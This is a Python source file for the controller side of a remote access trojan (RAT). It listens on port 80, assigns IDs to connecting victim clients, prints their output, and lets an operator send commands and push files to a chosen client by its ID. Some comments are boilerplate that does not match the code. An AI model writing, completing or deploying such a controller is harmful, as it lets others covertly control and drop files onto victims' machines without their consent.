import socket
import sys
from _thread import *
import random
import time

HOST = '10.3.39.117'  # Symbolic name meaning all available interfaces
PORT = 80  # Arbitrary non-privileged port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print('Socket created')

conns = {}

# Bind socket to local host and port
try:
    s.bind((HOST, PORT))
except socket.error as msg:
    print('Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
    sys.exit()

print('Socket bind complete')

# Start listening on socket
s.listen(10)
print('Socket now listening')


# Function for handling connections. This will be used to create threads
def clientthread(conn):
    # Sending message to connected client
    my_id = random.randint(1, 725809297)
    conns[my_id] = conn
    conn.send(str.encode('id: ' + str(my_id)))  # send only takes string

    # infinite loop so that function do not terminate and thread do not end.
    while True:

        # Receiving from client
        data = conn.recv(1024)
        reply = data
        if not data:
            break
        print(reply.decode('ASCII'))
        # conn.sendall(reply)

    # came out of loop
    print("connection closed")
    conn.close()


def inputter():
    while True:
        command = input("söyle abi:")
        if "id>>" in command:
            xxx = command.split(">>", 3)
            rat_id = xxx[1]
            conns[int(rat_id)].sendall(str.encode(">>" + xxx[2] + ">>" + xxx[3]))
            if xxx[2] == "file":
                '''
                conns[int(rat_id)].sendall(str.encode(">>" + xxx[2] + ">>" + xxx[3]))
                file = open(xxx[3], 'rb')
                print(file)
                data = file.read()
                #print(type(data), data)
                conns[int(rat_id)].sendall(data)
                file.close()
                '''
                with open(xxx[3], 'rb') as f:
                    while 1:
                        file_data = f.read()
                        if file_data == '' or len(file_data) < 1:
                            break
                        # begin sending file
                        conns[int(rat_id)].sendall(file_data)
                f.close()
                time.sleep(1)
                conns[int(rat_id)].sendall(str.encode('HELLORATHELLORAT'))
                print("The Last")
                time.sleep(1)


# now keep talking with the client
while 1:
    # wait to accept a connection - blocking call
    conn, addr = s.accept()
    print('Connected with ' + addr[0] + ':' + str(addr[1]))

    # start new thread takes 1st argument as a function name to be run, second is the tuple of arguments to the function.
    start_new_thread(clientthread, (conn,))
    start_new_thread(inputter, ())
s.close()
